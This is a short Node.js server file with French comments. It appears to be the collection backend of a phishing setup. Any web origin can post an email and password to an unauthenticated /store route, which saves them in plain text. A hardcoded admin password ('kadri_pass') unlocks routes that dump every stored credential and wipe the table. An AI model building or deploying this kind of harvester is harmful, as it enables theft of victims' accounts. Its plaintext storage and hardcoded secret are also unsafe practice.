const http = require('http');
const db = require('./database.js'); // Importer la base de données

// Définir un mot de passe pour sécuriser l'accès
const ADMIN_PASSWORD = "kadri_pass";

const requestListener = (req, res) => {
    console.log(`Requête reçue : Méthode ${req.method}, URL ${req.url}`);

    // Configurer les en-têtes CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // Vérifier le mot de passe pour les routes sécurisées
    const password = req.headers['authorization']; // Le mot de passe est envoyé dans les en-têtes
    if ((req.method === 'GET' || req.method === 'DELETE') && password !== ADMIN_PASSWORD) {
        res.writeHead(401, { 'Content-Type': 'text/plain' });
        res.end('Mot de passe requis ou incorrect.');
        return;
    }

    // Route POST pour stocker les données
    if (req.method === 'POST' && req.url === '/store') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, password } = data;

                if (!email || !password) {
                    res.writeHead(400, { 'Content-Type': 'text/plain' });
                    res.end('Email et mot de passe sont requis.');
                    return;
                }

                // Insérer les données dans la base de données
                const query = `INSERT INTO credentials (email, password) VALUES (?, ?)`;
                db.run(query, [email, password], function (err) {
                    if (err) {
                        console.error('Erreur lors de l\'insertion dans la base de données :', err);
                        res.writeHead(500, { 'Content-Type': 'text/plain' });
                        res.end('Erreur lors de l\'enregistrement.');
                    } else {
                        console.log('Données enregistrées avec succès, ID :', this.lastID);
                        res.writeHead(200, { 'Content-Type': 'text/plain' });
                        res.end('Informations enregistrées avec succès.');
                    }
                });
            } catch (err) {
                console.error('Erreur JSON :', err);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Données JSON invalides.' }));
            }
        });
    }

    // Route GET pour récupérer les données
    else if (req.method === 'GET' && req.url === '/data') {
        const query = `SELECT * FROM credentials`;
        db.all(query, [], (err, rows) => {
            if (err) {
                console.error('Erreur lors de la récupération des données :', err);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Erreur lors de la récupération des données.' }));
            } else {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(rows));
            }
        });
    }

    // Route DELETE pour vider la table credentials
    else if (req.method === 'DELETE' && req.url === '/delete_all') {
        const deleteQuery = `DELETE FROM credentials`;
        const resetSequenceQuery = `DELETE FROM sqlite_sequence WHERE name='credentials'`;
    
        // Supprimer toutes les données
        db.run(deleteQuery, function (err) {
            if (err) {
                console.error('Erreur lors de la suppression des données :', err);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Erreur lors de la suppression des données.');
                return;
            }
    
            // Réinitialiser le compteur d'auto-incrémentation
            db.run(resetSequenceQuery, function (err) {
                if (err) {
                    console.error('Erreur lors de la réinitialisation du compteur :', err);
                    res.writeHead(500, { 'Content-Type': 'text/plain' });
                    res.end('Erreur lors de la réinitialisation du compteur.');
                    return;
                }
    
                console.log('Toutes les données ont été supprimées et le compteur réinitialisé.');
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('Toutes les données ont été supprimées et le compteur réinitialisé.');
            });
        });
    }       

    // Route non trouvée
    else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Route non trouvée.');
    }
};

const server = http.createServer(requestListener);

const PORT = 3001;
server.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
